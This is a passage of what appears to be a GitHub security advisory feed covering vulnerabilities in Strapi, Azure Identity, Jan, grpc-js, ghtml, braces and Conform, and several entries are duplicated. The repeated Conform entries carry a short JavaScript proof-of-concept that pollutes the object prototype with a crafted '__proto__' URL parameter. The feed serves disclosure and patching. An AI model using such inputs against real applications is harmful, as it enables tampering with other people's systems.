<li>Notice that protected collection items from Admin appear in drop down. These should be hidden</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Security vulnerability where authors have access to protected data created by admin. This could be passwords emails or any other item created for the admin's collection. </p>
<p>See images below for more context</p>
<p>Permissions set
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132222-66e85726-5e01-4ad3-901a-809270a7f11b.png"></p>
<p>Good at top level no items seen
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132292-d63fa6df-f32d-48a3-80d0-48a651c570a8.png"></p>
<p>Drop down in Author login can see Admin data
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132393-8105bae2-b45c-4327-b1c6-da093557e64f.png"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-6j89-frxc-q26m">https://github.com/strapi/strapi/security/advisories/GHSA-6j89-frxc-q26m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29181">https://nvd.nist.gov/vuln/detail/CVE-2024-29181</a></li>
<li><a href="https://github.com/strapi/strapi/commit/e1dfd4d9f1cab25cf6da3614c1975e4e508e01c6">https://github.com/strapi/strapi/commit/e1dfd4d9f1cab25cf6da3614c1975e4e508e01c6</a></li>
<li><a href="https://github.com/advisories/GHSA-6j89-frxc-q26m">https://github.com/advisories/GHSA-6j89-frxc-q26m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j89-frxc-q26m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-12T19:38:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@azure/identity] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</id>
        <link href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"/>
        <updated>2024-06-13T18:44:18.000Z</updated>
        <content type="html"><![CDATA[<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35255">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>
<li><a href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-11T18:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@janhq/core] Jan path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-878h-rqcq-mv3x</id>
        <link href="https://github.com/advisories/GHSA-878h-rqcq-mv3x"/>
        <updated>2024-06-11T19:56:11.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file upload vulnerability in the /v1/app/appendFileSync interface of Jan v0.4.12 allows attackers to execute arbitrary code via uploading a crafted file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37273">https://nvd.nist.gov/vuln/detail/CVE-2024-37273</a></li>
<li><a href="https://github.com/HackAllSec/CVEs/tree/main/Jan%20Arbitrary%20File%20Upload%20vulnerability">https://github.com/HackAllSec/CVEs/tree/main/Jan%20Arbitrary%20File%20Upload%20vulnerability</a></li>
<li><a href="https://github.com/advisories/GHSA-878h-rqcq-mv3x">https://github.com/advisories/GHSA-878h-rqcq-mv3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-878h-rqcq-mv3x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-04T21:32:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@janhq/core] Jan path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qfjh-mvq6-c5p8</id>
        <link href="https://github.com/advisories/GHSA-qfjh-mvq6-c5p8"/>
        <updated>2024-06-11T19:56:06.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file upload vulnerability in the /v1/app/writeFileSync interface of Jan v0.4.12 allows attackers to execute arbitrary code via uploading a crafted file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36858">https://nvd.nist.gov/vuln/detail/CVE-2024-36858</a></li>
<li><a href="https://github.com/HackAllSec/CVEs/tree/main/Jan%20Arbitrary%20File%20Upload%20vulnerability">https://github.com/HackAllSec/CVEs/tree/main/Jan%20Arbitrary%20File%20Upload%20vulnerability</a></li>
<li><a href="https://github.com/advisories/GHSA-qfjh-mvq6-c5p8">https://github.com/advisories/GHSA-qfjh-mvq6-c5p8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qfjh-mvq6-c5p8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-04T21:32:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@janhq/core] Jan path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5jqc-qj57-4hrc</id>
        <link href="https://github.com/advisories/GHSA-5jqc-qj57-4hrc"/>
        <updated>2024-06-11T19:29:49.000Z</updated>
        <content type="html"><![CDATA[<p>Jan v0.4.12 was discovered to contain an arbitrary file read vulnerability via the /v1/app/readFileSync interface.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36857">https://nvd.nist.gov/vuln/detail/CVE-2024-36857</a></li>
<li><a href="https://github.com/HackAllSec/CVEs/tree/main/Jan%20AFR%20vulnerability">https://github.com/HackAllSec/CVEs/tree/main/Jan%20AFR%20vulnerability</a></li>
<li><a href="https://github.com/advisories/GHSA-5jqc-qj57-4hrc">https://github.com/advisories/GHSA-5jqc-qj57-4hrc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5jqc-qj57-4hrc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T21:32:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grpc/grpc-js] @grpc/grpc-js can allocate memory for incoming messages well above configured limits]]></title>
        <id>https://github.com/advisories/GHSA-7v5v-9h63-cj86</id>
        <link href="https://github.com/advisories/GHSA-7v5v-9h63-cj86"/>
        <updated>2024-06-11T21:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There are two separate code paths in which memory can be allocated per message in excess of the <code>grpc.max_receive_message_length</code> channel option:</p>
<ol>
<li>If an incoming message has a size on the wire greater than the configured limit, the entire message is buffered before it is discarded.</li>
<li>If an incoming message has a size within the limit on the wire but decompresses to a size greater than the limit, the entire message is decompressed into memory, and on the server is not discarded.</li>
</ol>
<h3 id="patches">Patches</h3>
<p>This has been patched in versions 1.10.9, 1.9.15, and 1.8.22</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86">https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650">https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3">https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb">https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37168">https://nvd.nist.gov/vuln/detail/CVE-2024-37168</a></li>
<li><a href="https://github.com/advisories/GHSA-7v5v-9h63-cj86">https://github.com/advisories/GHSA-7v5v-9h63-cj86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v5v-9h63-cj86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T21:38:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grpc/grpc-js] @grpc/grpc-js can allocate memory for incoming messages well above configured limits]]></title>
        <id>https://github.com/advisories/GHSA-7v5v-9h63-cj86</id>
        <link href="https://github.com/advisories/GHSA-7v5v-9h63-cj86"/>
        <updated>2024-06-11T21:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There are two separate code paths in which memory can be allocated per message in excess of the <code>grpc.max_receive_message_length</code> channel option:</p>
<ol>
<li>If an incoming message has a size on the wire greater than the configured limit, the entire message is buffered before it is discarded.</li>
<li>If an incoming message has a size within the limit on the wire but decompresses to a size greater than the limit, the entire message is decompressed into memory, and on the server is not discarded.</li>
</ol>
<h3 id="patches">Patches</h3>
<p>This has been patched in versions 1.10.9, 1.9.15, and 1.8.22</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86">https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650">https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3">https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb">https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37168">https://nvd.nist.gov/vuln/detail/CVE-2024-37168</a></li>
<li><a href="https://github.com/advisories/GHSA-7v5v-9h63-cj86">https://github.com/advisories/GHSA-7v5v-9h63-cj86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v5v-9h63-cj86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T21:38:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grpc/grpc-js] @grpc/grpc-js can allocate memory for incoming messages well above configured limits]]></title>
        <id>https://github.com/advisories/GHSA-7v5v-9h63-cj86</id>
        <link href="https://github.com/advisories/GHSA-7v5v-9h63-cj86"/>
        <updated>2024-06-11T21:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There are two separate code paths in which memory can be allocated per message in excess of the <code>grpc.max_receive_message_length</code> channel option:</p>
<ol>
<li>If an incoming message has a size on the wire greater than the configured limit, the entire message is buffered before it is discarded.</li>
<li>If an incoming message has a size within the limit on the wire but decompresses to a size greater than the limit, the entire message is decompressed into memory, and on the server is not discarded.</li>
</ol>
<h3 id="patches">Patches</h3>
<p>This has been patched in versions 1.10.9, 1.9.15, and 1.8.22</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86">https://github.com/grpc/grpc-node/security/advisories/GHSA-7v5v-9h63-cj86</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650">https://github.com/grpc/grpc-node/commit/08b0422dae56467ecae1007e899efe66a8c4a650</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3">https://github.com/grpc/grpc-node/commit/674f4e351a619fd4532f84ae6dff96b8ee4e1ed3</a></li>
<li><a href="https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb">https://github.com/grpc/grpc-node/commit/a8a020339c7eab1347a343a512ad17a4aea4bfdb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37168">https://nvd.nist.gov/vuln/detail/CVE-2024-37168</a></li>
<li><a href="https://github.com/advisories/GHSA-7v5v-9h63-cj86">https://github.com/advisories/GHSA-7v5v-9h63-cj86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v5v-9h63-cj86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T21:38:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghtml] ghtml Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vvhj-v88f-5gxr</id>
        <link href="https://github.com/advisories/GHSA-vvhj-v88f-5gxr"/>
        <updated>2024-06-11T18:27:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>It is possible to introduce user-controlled JavaScript code and trigger a Cross-Site Scripting (XSS) vulnerability in some cases.</p>
<h2 id="actions-taken">Actions Taken</h2>
<ul>
<li>Updated the documentation to clarify that while <code>ghtml</code> escapes characters with special meaning in HTML, it does not provide comprehensive protection against all types of XSS attacks in every scenario. <strong><em>This aligns with the approach taken by other template engines. Developers should be cautious and take additional measures to sanitize user input and prevent potential vulnerabilities.</em></strong> More reading: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
<li>The backtick character (`) is now also escaped to prevent the creation of strings in most cases where a malicious actor somehow gains the ability to write JavaScript. This does not provide comprehensive protection either.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gurgunday/ghtml/security/advisories/GHSA-vvhj-v88f-5gxr">https://github.com/gurgunday/ghtml/security/advisories/GHSA-vvhj-v88f-5gxr</a></li>
<li><a href="https://github.com/gurgunday/ghtml/commit/df1ea50fe8968a766fd2b9379a8f9806375227f8">https://github.com/gurgunday/ghtml/commit/df1ea50fe8968a766fd2b9379a8f9806375227f8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37166">https://nvd.nist.gov/vuln/detail/CVE-2024-37166</a></li>
<li><a href="https://github.com/advisories/GHSA-vvhj-v88f-5gxr">https://github.com/advisories/GHSA-vvhj-v88f-5gxr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vvhj-v88f-5gxr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-10T21:36:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[braces] Uncontrolled resource consumption in braces]]></title>
        <id>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</id>
        <link href="https://github.com/advisories/GHSA-grv7-fg5c-xmjg"/>
        <updated>2024-06-10T20:17:26.000Z</updated>
        <content type="html"><![CDATA[<p>The NPM package <code>braces</code> fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In <code>lib/parse.js,</code> if a malicious user sends "imbalanced braces" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4068">https://nvd.nist.gov/vuln/detail/CVE-2024-4068</a></li>
<li><a href="https://github.com/micromatch/braces/issues/35">https://github.com/micromatch/braces/issues/35</a></li>
<li><a href="https://devhub.checkmarx.com/cve-details/CVE-2024-4068">https://devhub.checkmarx.com/cve-details/CVE-2024-4068</a></li>
<li><a href="https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308">https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</a></li>
<li><a href="https://github.com/micromatch/braces/pull/37">https://github.com/micromatch/braces/pull/37</a></li>
<li><a href="https://github.com/micromatch/braces/pull/40">https://github.com/micromatch/braces/pull/40</a></li>
<li><a href="https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff">https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</a></li>
<li><a href="https://github.com/advisories/GHSA-grv7-fg5c-xmjg">https://github.com/advisories/GHSA-grv7-fg5c-xmjg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-14T18:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/dom] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/yup] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/zod] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/yup] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
